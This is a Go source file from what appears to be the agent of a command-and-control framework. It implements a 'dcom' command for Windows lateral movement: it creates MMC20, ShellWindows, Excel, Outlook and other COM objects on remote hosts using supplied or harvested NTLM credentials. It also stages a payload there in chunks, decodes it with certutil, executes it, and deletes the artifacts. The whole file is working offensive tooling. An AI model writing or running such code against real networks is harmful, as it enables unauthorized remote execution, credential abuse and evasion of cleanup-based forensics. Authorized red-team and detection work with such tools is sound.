//go:build windows
// +build windows

// dcom.go implements DCOM lateral movement command infrastructure.
// Execution methods (MMC20, ShellWindows, ShellBrowser) are in dcom_methods.go.

package commands

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	ole "github.com/go-ole/go-ole"
	"golang.org/x/sys/windows"

	"fawkes/pkg/structs"
)

type DcomCommand struct{}

func (c *DcomCommand) Name() string {
	return "dcom"
}

func (c *DcomCommand) Description() string {
	return "Execute commands on remote hosts via DCOM lateral movement"
}

type dcomArgs struct {
	Action     string `json:"action"`
	Host       string `json:"host"`
	Object     string `json:"object"`
	Command    string `json:"command"`
	Args       string `json:"args"`
	Dir        string `json:"dir"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	Domain     string `json:"domain"`
	Timeout    int    `json:"timeout"`
	LocalPath  string `json:"local_path"`
	RemotePath string `json:"remote_path"`
	Method     string `json:"method"`
	Cleanup    bool   `json:"cleanup"`
}

// DCOM COM object CLSIDs
var (
	clsidMMC20          = ole.NewGUID("{49B2791A-B1AE-4C90-9B8E-E860BA07F889}")
	clsidShellWindows   = ole.NewGUID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
	clsidShellBrowserWd = ole.NewGUID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
	clsidWScriptShell   = ole.NewGUID("{72C24DD5-D70A-438B-8A42-98424B88AFB8}")
	clsidExcelApp       = ole.NewGUID("{00024500-0000-0000-C000-000000000046}")
	clsidOutlookApp     = ole.NewGUID("{0006F03A-0000-0000-C000-000000000046}")
)

// ole32.dll for CoCreateInstanceEx and CoSetProxyBlanket
var (
	ole32DCOM              = windows.NewLazySystemDLL("ole32.dll")
	procCoCreateInstanceEx = ole32DCOM.NewProc("CoCreateInstanceEx")
	procCoSetProxyBlanket  = ole32DCOM.NewProc("CoSetProxyBlanket")
)

// RPC authentication constants
const (
	rpcCAuthnWinNT           = 10 // NTLMSSP
	rpcCAuthzNone            = 0
	rpcCAuthnLevelConnect    = 2
	rpcCImpLevelImpersonate  = 3
	eoacNone                 = 0
	secWinNTAuthIdentityUnic = 0x2 // SEC_WINNT_AUTH_IDENTITY_UNICODE
	clsctxRemoteServer       = 0x10
)

// secWinNTAuthIdentityW matches SEC_WINNT_AUTH_IDENTITY_W for NTLM auth
type secWinNTAuthIdentityW struct {
	User           *uint16
	UserLength     uint32
	Domain         *uint16
	DomainLength   uint32
	Password       *uint16
	PasswordLength uint32
	Flags          uint32
}

// coAuthInfo matches COAUTHINFO for COM remote authentication
type coAuthInfo struct {
	dwAuthnSvc           uint32
	dwAuthzSvc           uint32
	pwszServerPrincName  *uint16
	dwAuthnLevel         uint32
	dwImpersonationLevel uint32
	pAuthIdentityData    uintptr
	dwCapabilities       uint32
}

// COSERVERINFO structure for remote COM activation
type coServerInfo struct {
	dwReserved1 uint32
	pwszName    *uint16
	pAuthInfo   uintptr
	dwReserved2 uint32
}

// MULTI_QI structure for interface results
type multiQI struct {
	pIID *ole.GUID
	pItf uintptr
	hr   int32
}

func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required.\nActions: exec\nObjects: mmc20, shellwindows, shellbrowser, wscript, excel, outlook")
	}

	args, parseErr := unmarshalParams[dcomArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	defer structs.ZeroString(&args.Password)

	if args.Timeout <= 0 {
		args.Timeout = 120
	}

	var fn func() structs.CommandResult
	switch strings.ToLower(args.Action) {
	case "exec":
		fn = func() structs.CommandResult { return dcomExec(args) }
	case "upload":
		fn = func() structs.CommandResult { return dcomUpload(args) }
	case "exec-staged":
		fn = func() structs.CommandResult { return dcomExecStaged(args) }
	default:
		return errorf("Unknown action: %s\nAvailable: exec, upload, exec-staged", args.Action)
	}

	// Run with timeout protection to prevent agent hangs on unreachable targets
	ch := make(chan structs.CommandResult, 1)
	go func() {
		ch <- fn()
	}()
	select {
	case r := <-ch:
		return r
	case <-time.After(time.Duration(args.Timeout) * time.Second):
		return errorf("DCOM operation timed out after %ds — target %s may be unreachable", args.Timeout, args.Host)
	}
}

// dcomAuthState holds authentication state for a DCOM session.
type dcomAuthState struct {
	identity *secWinNTAuthIdentityW
}

// cleanup zeroes the credential buffers held by the auth state.
func (a *dcomAuthState) cleanup() {
	if a == nil || a.identity == nil {
		return
	}
	if a.identity.Password != nil {
		zeroUTF16Ptr(a.identity.Password)
	}
	if a.identity.User != nil {
		zeroUTF16Ptr(a.identity.User)
	}
	if a.identity.Domain != nil {
		zeroUTF16Ptr(a.identity.Domain)
	}
	a.identity = nil
}

// setProxyBlanket calls CoSetProxyBlanket on an IDispatch to authenticate
// subsequent method calls on the remote COM proxy.
func (a *dcomAuthState) setProxyBlanket(disp *ole.IDispatch) error {
	if a == nil || a.identity == nil {
		return nil
	}
	ret, _, _ := procCoSetProxyBlanket.Call(
		uintptr(unsafe.Pointer(disp)),
		rpcCAuthnWinNT,                      // dwAuthnSvc
		rpcCAuthzNone,                       // dwAuthzSvc
		0,                                   // pServerPrincName (COLE_DEFAULT_PRINCIPAL)
		rpcCAuthnLevelConnect,               // dwAuthnLevel
		rpcCImpLevelImpersonate,             // dwImpersonationLevel
		uintptr(unsafe.Pointer(a.identity)), // pAuthInfo
		eoacNone,                            // dwCapabilities
	)
	if ret != 0 {
		return fmt.Errorf("CoSetProxyBlanket failed: HRESULT 0x%08X", ret)
	}
	return nil
}

// buildAuthState creates a dcomAuthState from credentials.
func buildAuthState(domain, username, password string) *dcomAuthState {
	if username == "" || password == "" {
		return nil
	}
	userUTF16, _ := windows.UTF16PtrFromString(username)
	domainUTF16, _ := windows.UTF16PtrFromString(domain)
	passwordUTF16, _ := windows.UTF16PtrFromString(password)

	return &dcomAuthState{
		identity: &secWinNTAuthIdentityW{
			User:           userUTF16,
			UserLength:     uint32(len(username)),
			Domain:         domainUTF16,
			DomainLength:   uint32(len(domain)),
			Password:       passwordUTF16,
			PasswordLength: uint32(len(password)),
			Flags:          secWinNTAuthIdentityUnic,
		},
	}
}

// resolveCredentials determines which credentials to use for DCOM auth.
func resolveCredentials(args dcomArgs) (domain, username, password string, hasExplicit bool) {
	if args.Username != "" && args.Password != "" {
		domain = args.Domain
		if domain == "" {
			domain = "."
		}
		return domain, args.Username, args.Password, true
	}
	creds := GetIdentityCredentials()
	if creds != nil {
		return creds.Domain, creds.Username, creds.Password, true
	}
	return "", "", "", false
}

func dcomExec(args dcomArgs) structs.CommandResult {
	if args.Host == "" {
		return errorResult("Error: host is required")
	}
	if args.Command == "" {
		return errorResult("Error: command is required")
	}

	object := strings.ToLower(args.Object)
	if object == "" {
		object = "mmc20"
	}

	switch object {
	case "mmc20":
		return dcomExecMMC20(args)
	case "shellwindows":
		return dcomExecShellWindows(args)
	case "shellbrowser":
		return dcomExecShellBrowser(args)
	case "wscript":
		return dcomExecWScript(args)
	case "excel":
		return dcomExecExcel(args)
	case "outlook":
		return dcomExecOutlook(args)
	default:
		return errorf("Unknown DCOM object: %s\nAvailable: mmc20, shellwindows, shellbrowser, wscript, excel, outlook", args.Object)
	}
}

// createRemoteCOM creates a COM object on a remote host via CoCreateInstanceEx.
func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password string) (*ole.IDispatch, *dcomAuthState, error) {
	hostUTF16, err := windows.UTF16PtrFromString(host)
	if err != nil {
		return nil, nil, fmt.Errorf("invalid host: %w", err)
	}

	serverInfo := &coServerInfo{
		pwszName: hostUTF16,
	}

	authState := buildAuthState(domain, username, password)

	if authState != nil {
		authInfo := &coAuthInfo{
			dwAuthnSvc:           rpcCAuthnWinNT,
			dwAuthzSvc:           rpcCAuthzNone,
			pwszServerPrincName:  nil,
			dwAuthnLevel:         rpcCAuthnLevelConnect,
			dwImpersonationLevel: rpcCImpLevelImpersonate,
			pAuthIdentityData:    uintptr(unsafe.Pointer(authState.identity)),
			dwCapabilities:       eoacNone,
		}
		serverInfo.pAuthInfo = uintptr(unsafe.Pointer(authInfo))
	}

	qi := multiQI{
		pIID: ole.IID_IDispatch,
	}

	ret, _, _ := procCoCreateInstanceEx.Call(
		uintptr(unsafe.Pointer(clsid)),
		0, // punkOuter
		clsctxRemoteServer,
		uintptr(unsafe.Pointer(serverInfo)),
		1, // dwCount
		uintptr(unsafe.Pointer(&qi)),
	)

	if ret != 0 {
		return nil, nil, fmt.Errorf("CoCreateInstanceEx failed: HRESULT 0x%08X", ret)
	}
	if qi.hr != 0 {
		return nil, nil, fmt.Errorf("interface query failed: HRESULT 0x%08X", qi.hr)
	}
	if qi.pItf == 0 {
		return nil, nil, fmt.Errorf("CoCreateInstanceEx returned nil interface")
	}

	disp := (*ole.IDispatch)(unsafe.Pointer(qi.pItf))

	if authState != nil {
		if err := authState.setProxyBlanket(disp); err != nil {
			disp.Release()
			return nil, nil, fmt.Errorf("failed to set proxy blanket: %w", err)
		}
	}

	return disp, authState, nil
}

// dcomRunCmd is a helper that executes a single command via DCOM and returns success/failure.
func dcomRunCmd(args dcomArgs, command string) bool {
	execArgs := args
	execArgs.Command = command
	result := dcomExec(execArgs)
	return (result.Status == "success")
}

// dcomUpload stages a local file on the remote host via DCOM command execution.
func dcomUpload(args dcomArgs) structs.CommandResult {
	if args.LocalPath == "" {
		return errorResult("Error: local_path is required (file to upload from agent filesystem)")
	}
	if args.Host == "" {
		return errorResult("Error: host is required (remote target)")
	}

	method := parseStagingMethod(args.Method)
	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
	if err != nil {
		return errorf("Error planning staging: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Staging file to %s via DCOM (%s):\n", args.Host, args.Object))
	sb.WriteString(fmt.Sprintf("  Source:      %s\n", args.LocalPath))
	sb.WriteString(fmt.Sprintf("  Destination: %s\n", plan.RemotePath))
	sb.WriteString(fmt.Sprintf("  Method:      %s\n", args.Method))
	sb.WriteString(fmt.Sprintf("  Commands:    %d write + %d decode\n\n", len(plan.WriteCommands), boolToInt(plan.DecodeCommand != "")))

	for i, cmd := range plan.WriteCommands {
		if !dcomRunCmd(args, cmd) {
			return errorf("Error on write chunk %d/%d", i+1, len(plan.WriteCommands))
		}
		sb.WriteString(fmt.Sprintf("  [%d/%d] Write chunk OK\n", i+1, len(plan.WriteCommands)))
	}

	if plan.DecodeCommand != "" {
		if !dcomRunCmd(args, plan.DecodeCommand) {
			return errorResult("Error decoding staged file via certutil")
		}
		sb.WriteString("  Decode OK\n")
	}

	sb.WriteString(fmt.Sprintf("\nFile staged at: %s\n", plan.RemotePath))
	return successResult(sb.String())
}

// dcomExecStaged uploads a file, executes it, and optionally cleans up via DCOM.
func dcomExecStaged(args dcomArgs) structs.CommandResult {
	if args.LocalPath == "" {
		return errorResult("Error: local_path is required (file to stage and execute)")
	}
	if args.Host == "" {
		return errorResult("Error: host is required (remote target)")
	}

	method := parseStagingMethod(args.Method)
	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
	if err != nil {
		return errorf("Error planning staging: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Staged execution on %s via DCOM (%s):\n", args.Host, args.Object))
	sb.WriteString(fmt.Sprintf("  Source:  %s\n", args.LocalPath))
	sb.WriteString(fmt.Sprintf("  Remote:  %s\n", plan.RemotePath))
	sb.WriteString(fmt.Sprintf("  Method:  %s\n\n", args.Method))

	// Phase 1: Stage
	sb.WriteString("--- Phase 1: Staging ---\n")
	for i, cmd := range plan.WriteCommands {
		if !dcomRunCmd(args, cmd) {
			return errorf("Staging failed on chunk %d/%d", i+1, len(plan.WriteCommands))
		}
		sb.WriteString(fmt.Sprintf("  [%d/%d] Write OK\n", i+1, len(plan.WriteCommands)))
	}

	if plan.DecodeCommand != "" {
		if !dcomRunCmd(args, plan.DecodeCommand) {
			for _, cmd := range plan.CleanupCommands {
				dcomRunCmd(args, cmd)
			}
			return errorResult("Decode failed — cleaned up staging artifacts")
		}
		sb.WriteString("  Decode OK\n")
		dcomRunCmd(args, fmt.Sprintf(`cmd.exe /c del /f /q "%s.b64"`, plan.RemotePath))
	}

	// Phase 2: Execute
	sb.WriteString("\n--- Phase 2: Execution ---\n")
	execCmd := plan.RemotePath
	if args.Command != "" {
		execCmd = fmt.Sprintf(`%s %s`, plan.RemotePath, args.Command)
	}
	dcomRunCmd(args, execCmd)
	sb.WriteString(fmt.Sprintf("  Executed: %s\n", execCmd))

	// Phase 3: Cleanup
	if args.Cleanup {
		sb.WriteString("\n--- Phase 3: Cleanup ---\n")
		for _, cmd := range plan.CleanupCommands {
			dcomRunCmd(args, cmd)
		}
		sb.WriteString("  Artifacts removed\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  File remains at %s (use cleanup=true to auto-remove)\n", plan.RemotePath))
	}

	return successResult(sb.String())
}
